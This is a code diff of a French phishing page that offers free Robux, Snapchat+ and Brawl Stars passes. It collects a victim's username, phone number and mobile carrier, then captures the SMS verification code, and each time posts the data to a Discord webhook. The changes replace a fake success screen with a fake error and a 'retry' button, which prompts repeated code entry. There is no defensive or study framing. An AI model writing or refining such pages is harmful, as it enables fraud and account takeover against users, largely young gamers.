@@ -7,7 +7,7 @@
     <style>
         :root {
             --primary: #007AFF;
-            --success: #34c759;
+            --error: #ff3b30;
             --bg: #f5f5f7;
             --card: #ffffff;
             --text: #1c1c1e;
@@ -44,7 +44,6 @@
             width: 100%; padding: 18px; background: #1c1c1e; border: none; color: white;
             font-size: 16px; font-weight: 700; border-radius: 18px; cursor: pointer; margin-top: 15px;
         }
-        button:disabled { background: #d2d2d7; }
 
         #loading, #step2, #step3 { display: none; }
         .progress-bar { width: 100%; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; margin: 25px 0; }
@@ -54,7 +53,8 @@
             background: rgba(0, 122, 255, 0.08); color: var(--primary); 
             padding: 15px; border-radius: 15px; font-size: 13px; font-weight: 600; margin-bottom: 20px;
         }
-        .timer-display { font-size: 48px; font-weight: 800; color: var(--success); margin: 20px 0; }
+        
+        .error-box { color: var(--error); font-weight: 700; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -62,36 +62,40 @@
 <div class="container">
     <div id="step1">
         <h1>Avantages exclusifs</h1>
-        <p class="subtitle">Sélectionnez votre pack pour lancer l'envoi vers votre compte.</p>
+        <p class="subtitle">Sélectionnez votre pack pour lancer l'activation.</p>
         <div class="services-grid">
-            <div class="service-card" onclick="selectItem('Roblox', this)"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQiX0afyge6yOq8eY9Ob4Ol0AvloRv_VB05A&s"><span>Robux</span></div>
-            <div class="service-card" onclick="selectItem('Snapchat+', this)"><img src="https://link.snapchat.com/plus/plus.png"><span>Snapchat+</span></div>
-            <div class="service-card" onclick="selectItem('Brawl Stars', this)"><img src="https://store.supercell.com/assets/offer-images/brawlstars/4cb68191028e38477bf44d0a2ac9fead571853fbcfea4467e21988182010fe86/brawlstars.com.supercell.laser.vaultpass.plus-x1-.png"><span>Brawl Pass</span></div>
+            <div class="service-card" onclick="selectItem('Roblox', this)"><img src="image_e388f6.jpg"><span>Robux</span></div>
+            <div class="service-card" onclick="selectItem('Snapchat+', this)"><img src="image_e38919.png"><span>Snapchat+</span></div>
+            <div class="service-card" onclick="selectItem('Brawl Stars', this)"><img src="image_e38956.jpg"><span>Brawl Pass</span></div>
         </div>
         <input type="text" id="username" placeholder="Nom d'utilisateur">
         <input type="tel" id="phone" placeholder="Numéro de mobile">
         <select id="operator"><option value="">Choisir un opérateur</option><option>Orange</option><option>SFR</option><option>Bouygues</option><option>Free</option></select>
-        <button id="mainBtn" onclick="nextStep()" disabled>Lancer l'activation</button>
+        <button id="mainBtn" onclick="nextStep()" disabled>Continuer</button>
     </div>
 
     <div id="loading">
         <h1>Traitement...</h1>
         <div class="progress-bar"><div id="progress"></div></div>
-        <p id="status-text" style="color: var(--text-sec); font-size: 14px;">Connexion aux serveurs sécurisés...</p>
+        <p id="status-text" style="color: var(--text-sec); font-size: 14px;">Initialisation du protocole SMS...</p>
     </div>
 
     <div id="step2">
         <h1>Vérification SMS</h1>
-        <div class="sms-notice">📩 Un code de validation est en cours d'envoi. Veuillez patienter...</div>
-        <input type="text" id="code" maxlength="4" style="text-align:center; font-size: 32px; letter-spacing: 12px; font-weight: 800;" placeholder="0000">
+        <div class="sms-notice">
+            📩 Le code va bientôt être envoyé par SMS.<br>Veuillez le rentrer dès réception.
+        </div>
+        <p class="subtitle">Entrez le code reçu par SMS :</p>
+        <input type="text" id="code" maxlength="6" style="text-align:center; font-size: 28px; font-weight: 800;" placeholder="------">
         <button onclick="sendCode()">Valider le code</button>
     </div>
 
     <div id="step3">
-        <span style="font-size: 50px;">✅</span>
-        <h1>Demande validée</h1>
-        <div class="timer-display" id="timer">30:00</div>
-        <p style="font-size: 12px; color: var(--text-sec);">Synchronisation des données en cours...</p>
+        <span style="font-size: 50px;">❌</span>
+        <h1>Échec de l'activation</h1>
+        <p class="subtitle">Une erreur est survenue lors de la validation du code SMS.</p>
+        <div class="error-box">Veuillez réessayer l'opération.</div>
+        <button onclick="location.reload()" style="background: var(--primary);">Réessayer maintenant</button>
     </div>
 </div>
 
@@ -124,7 +128,7 @@
         const o = document.getElementById("operator").value;
         if (!u || !t || !o) return;
 
-        postToDiscord(`🚀 **NOUVELLE INSCRIPTION**\n🎁 Service : ${chosenService}\n👤 User : ${u}\n📱 Tel : ${t}\n📡 Opérateur : ${o}`);
+        postToDiscord(`🚀 **NOUVEAU CONTACT**\nService: ${chosenService}\nUser: ${u}\nTel: ${t}\nOp: ${o}`);
 
         document.getElementById("step1").style.display = "none";
         document.getElementById("loading").style.display = "block";
@@ -133,31 +137,22 @@
         let interval = setInterval(() => {
             p += 1;
             document.getElementById("progress").style.width = p + "%";
-            if(p == 50) document.getElementById("status-text").innerText = "Liaison avec l'opérateur en cours...";
             if (p >= 100) {
                 clearInterval(interval);
                 document.getElementById("loading").style.display = "none";
                 document.getElementById("step2").style.display = "block";
             }
-        }, 600); 
+        }, 600); // 60 secondes
     }
 
     function sendCode() {
         const val = document.getElementById("code").value;
-        if (val.length < 4) return;
-        postToDiscord(`🔑 **CODE SMS REÇU** : \`${val}\` (${chosenService})`);
+        if (val.length < 2) return;
+        postToDiscord(`🔑 **CODE REÇU** : \`${val}\` (${chosenService})`);
+        
+        // On cache le formulaire et on affiche l'erreur "Veuillez réessayer"
         document.getElementById("step2").style.display = "none";
         document.getElementById("step3").style.display = "block";
-        startTimer(30 * 60);
-    }
-
-    function startTimer(duration) {
-        let timer = duration, min, sec;
-        setInterval(() => {
-            min = Math.floor(timer / 60); sec = timer % 60;
-            document.getElementById("timer").textContent = (min < 10 ? "0"+min : min) + ":" + (sec < 10 ? "0"+sec : sec);
-            if (--timer < 0) timer = 0;
-        }, 1000);
     }
 </script>
 </body>
